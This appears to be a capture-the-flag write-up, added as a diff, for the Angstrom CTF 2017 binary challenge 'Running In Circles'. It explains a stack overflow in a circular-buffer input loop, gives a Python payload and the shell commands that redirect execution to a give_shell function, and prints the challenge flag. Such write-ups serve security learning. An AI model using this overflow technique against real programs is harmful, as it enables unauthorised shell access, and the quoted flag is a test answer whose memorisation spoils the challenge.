@@ -1,0 +1,62 @@
+:: Exploit/Writeup for the Angstrom CTF 2017, Binary, 50, Running In Circles
+::
+:: URL: angstromctf.com
+:.--------------------------------------------------------------------------------------------- :
+:.. By Asger Friis-Vigh of Rota Galaxy, April 2017 .............................................:
+
+
+* Looking at the C source, we aim to hit:
+
+void give_shell()
+{
+	gid_t gid = getegid();
+	setresgid(gid, gid, gid);
+	system("/bin/sh -i");
+}
+
+* We notice how the main function has an array on the stack:
+
+int main(int argc, char **argv)
+{
+	char buffer[256];
+	int pos = 0;
+...
+
+* Can we trick a stack smash here? Let's look at the handling of our data:
+
+int pos = 0;
+...
+		scanf("%u", &len);
+...
+		printf("Enter your data: "); fflush(stdout);
+		if (len < 256 - pos)
+		{
+			fgets(&buffer[pos], len, stdin);
+			pos += len;
+		}
+		else
+		{
+			fgets(&buffer[pos], 256 - pos, stdin);
+			len -= (256 - pos);
+			pos = 0;
+
+			fgets(&buffer[0], len, stdin);
+			pos += len;
+		}
+
+* So a length less than 256 is no good, as there's a range check there. But for more than 256 bytes
+  we first copy 256 bytes and then another copy for the remaining bytes. Wait, the remaining bytes
+  can then be anything? Yes, and this means that any input length above 256 will corrupt the stack.
+
+* Going into IDA Pro and debugging this will now show exactly how many bytes we need. This is a little
+  trial and error, but in the end I used the commands below to stack smash into <give_shell> and read
+  the flag:
+
+$ python -c 'print "560\n" + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEBBBBBBBB\x06\x08\x40\x00\x00\x00\x00\x00\n" + "0"' > /home/ctfuser/teamXXXXXX/fmt
+
+$ (cat /home/ctfuser/teamXXXXXX/fmt;cat) | ./run_circles
+
+cat /problems/running_in_circles/flag.txt >> /home/ctfuser/teamXXXXXX/flag2.txt
+
+actf{you_dont_just_go_around_a_circle_once}
+
